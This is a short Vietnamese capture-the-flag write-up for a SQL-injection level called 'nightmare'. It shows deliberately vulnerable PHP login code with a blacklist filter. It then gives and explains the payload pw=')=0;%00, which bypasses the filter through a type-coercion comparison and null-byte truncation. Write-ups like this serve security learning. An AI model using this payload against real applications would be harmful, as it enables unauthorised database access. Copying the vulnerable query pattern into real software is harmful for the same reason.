nightmare
===
### Description
- Source:
```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

### Solution
- Phân tích code: Chúng ta có tham số để input vào là `pw` bị filter các kí tự để khỏi chúng ta attack vào các table khác ở trong database và có filter các kí tự để comment trong sql đó là `#, -`. Input của chúng ta phải <=6 nếu không sẽ thoát chương trình.
- Câu query sẽ trả về id nếu như có pw nhưng pw đó không phải của id=admin.
- Chúng ta chỉ cần biến câu query ở pw đúng và comment query ở id là sẽ thành công

#### Payload
- `pw=')=0;%00`
- Payload ở trên khi được input vào `pw` thì câu query sẽ trở thành `select id from prob_nightmare where pw=('')=0;%00') and id!='admin'` có nghĩa là pw ở phía trong () sẽ bằng null mà null = 0 thì sẽ thành true và %00 có tác dụng dừng đoạn query ở phía sau